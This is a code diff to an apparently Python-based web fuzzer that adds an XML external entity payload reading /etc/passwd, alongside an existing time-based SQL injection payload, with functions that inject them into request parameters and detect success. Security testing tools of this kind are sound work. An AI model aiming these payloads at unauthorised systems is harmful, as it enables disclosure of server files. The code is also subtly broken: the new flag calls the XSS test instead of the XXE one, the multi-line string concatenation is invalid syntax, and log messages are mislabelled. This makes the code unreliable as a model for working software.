@@ -24,6 +24,13 @@ class Fuzz:
     def get_SQL_payload(self):
         return '1\'; sleep(3)'
 
+    # from https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
+    def get_XEE_payload(self):
+        return ' <?xml version="1.0" encoding="ISO-8859-1"?>' +
+                '<!DOCTYPE foo [ ' +
+                '<!ELEMENT foo ANY >' +
+                '<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
+
     def put_headers(self, s, requestId):
         s.headers.update(self.headers[requestId])
         #print self.headers[requestId]
@@ -37,7 +44,7 @@ class Fuzz:
             return s.post(url, params=post, verify=False)
         return None
 
-    def __init__(self, reqs, headers, xss, sqli):
+    def __init__(self, reqs, headers, xss, sqli, xee):
         self.requests= copy.deepcopy(reqs)
 
         # get params
@@ -56,6 +63,7 @@ class Fuzz:
         # copy testing flags
         self.xss=xss
         self.sqli=sqli
+        self.xee=xee
 
     def estimate_effort(self):
         total=0
@@ -86,6 +94,9 @@ class Fuzz:
                         self.testXSS('GET',request['url'],request['requestId'],param)
                     if self.sqli:
                         self.testSQL('GET',request['url'],request['requestId'],param)
+                    if self.xee:
+                        self.testXSS('GET',request['url'],request['requestId'],param)
+
                 #print self.send_req(requests[i]['requestId'], s, requests[i]['url'], 'GET').text.encode('utf-8')
             elif request['method']=='POST':
                 if 'formData' in request['requestBody']:
@@ -94,6 +105,8 @@ class Fuzz:
                             self.testXSS('POST',request['url'],request['requestId'],param,request['requestBody'])
                         if self.sqli:
                             self.testSQL('POST',request['url'],request['requestId'],param,request['requestBody'])
+                        if self.xee:
+                            self.testXSS('POST',request['url'],request['requestId'],param,request['requestBody'])
 
                         #print self.send_req(requests[i]['requestId'], s, requests[i]['url'], 'POST' , post=requests[i]['requestBody']).text.encode('utf-8')
 
@@ -257,3 +270,27 @@ class Fuzz:
             response = self.send_req(requestId, s, url, 'POST', post=newPost)
             print "Attempting GET SQLI on "+param
             self.verifySQL(response, param, requestId)
+
+    def verifyXEE(self, response, param, requestId):
+        try:
+            response.text.index('root:x:0:0:root')
+            print "XEE found in "+requestId+" "+param
+            return True
+        except:
+            return False
+
+    def testXEE(self, method, url, requestId, param, postData=None):
+        s=requests.Session()
+        if method=='GET':
+            newUrl = Fuzz.substParam(url,param,self.get_XEE_payload())
+            self.catchUp(s)
+            response = self.send_req(requestId, s, newUrl, 'GET')
+            print "Attempting GET XEE on "+param
+            self.verifyXEE(response, param, requestId)
+        elif method=='POST':
+            newPost=copy.deepcopy(postData)
+            newPost['formData'][param]=self.get_XEE_payload()
+            self.catchUp(s)
+            response = self.send_req(requestId, s, url, 'POST', post=newPost)
+            print "Attempting GET XEE on "+param
+            self.verifyXEE(response, param, requestId)
